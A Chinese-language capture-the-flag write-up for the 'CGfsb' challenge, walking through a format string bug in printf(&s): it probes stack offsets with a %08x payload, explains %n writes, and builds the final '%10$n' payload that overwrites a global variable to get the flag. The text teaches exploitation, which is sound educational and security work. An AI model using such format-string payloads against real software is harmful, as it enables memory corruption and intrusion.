# CGfsb

题目来源：https://adworld.xctf.org.cn/task/

这道题是我第一次接触这个漏洞，由题目的提示和代码中的漏洞特点很容易判断，这个漏洞是格式化字符串漏洞，但是由于以前没有接触过类似的漏洞，所以先学习了一下，先看一下代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [esp+1Eh] [ebp-7Eh]
  int v5; // [esp+22h] [ebp-7Ah]
  __int16 v6; // [esp+26h] [ebp-76h]
  char s; // [esp+28h] [ebp-74h]
  unsigned int v8; // [esp+8Ch] [ebp-10h]

  v8 = __readgsdword(0x14u);
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  buf = 0;
  v5 = 0;
  v6 = 0;
  memset(&s, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 0xAu);
  puts("leave your message please:");
  fgets(&s, 100, stdin);
  printf("hello %s", &buf);
  puts("your message is:");
  printf(&s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
  return 0;
}
```

先看一下代码的主流程。首先给字符串 s 赋予初值，随后向 buf 中输入姓名，然后向 s 中输入字符串后，如果 pwnme 变量值为 8，则成功获得 flag。由于我之前没接触过字符串格式化漏洞，所以看到在这个流程中并没有修改 pwnme 非常意外，此外也没有其他的函数可以帮忙了。

看一眼这道题的安全防护：

```
Arch:     i386-32-little                                                  
RELRO:    Partial RELRO                                                   
Stack:    Canary found                                                      
NX:       NX enabled                                                         
PIE:      No PIE (0x8048000)
```

这道题目并没有开启 PIE 地址随机化。而 pwnme 这个变量是一个全局变量，地址是固定已知的。那么问题就是通过某个手段修改该地址的值。

这个代码中漏洞点很明显，就是 `printf(&s)`。这种写法不能说错，但是一般不会这么用。这就是字符串格式化漏洞的经典案例。由于我可以往 s 变量中输入任意的数据，并且数据就是保存在了栈中的 s 变量中，所以可以先打印栈中的数据，来查看运行这个 printf 时的栈帧数据分布：

```
AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

一般就是按照上面的格式，因为 printf 先扫描第一个格式字符串，来判断输出格式，所以这个输出的就是栈中的数据，观察它的内容：

> AAAAff9d4f3e,f774b5a0,00f0b5ff,ff9d4f6e,00000001,000000c2,6161a8fb,0a616161,00000000,41414141,78383025,3830252c

因为开头的四个字符 AAAA 也在栈中，目的就是要直到它到底在栈的哪个位置。可以发现在 AAAA 后的第 10 个位置出现了 0x41 的字样，说明 AAAA 开始的字符串就存放在那里。

**这是格式化漏洞攻击的第一步，找到格式化字符串在当前栈中的位置。**随后第二步是借助 printf 中一个特殊的格式字符串类型 %n 来写入数据。

%n 记录了在它前面的字符长度，并且将它的值保存在某个变量中，举网上的例子：

```
int val;
printf("jksd%n", &val) // val = 4
```

那么只需要指定某个地址作为目标，而这里就是 pwnme 的地址，根据刚才发现的规律构造字符串：

```
p32(addr(pwnme)).%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
```

然后要在第 10 个地址处插入数据，并且保证在 %n 的格式字符串前只有 8 个字符，也就是只用 8 个字节，这里有个小技巧：在 linux 中，如果想专门输入第 m 个参数对应的值，可以简写为 `%m$x`，意思是想看第 m 个参数以 %x 的格式输出。同理也能用在 %n 上：

```
p32(addr(pwnme)) + 'aaaa' + '%10$n'
```

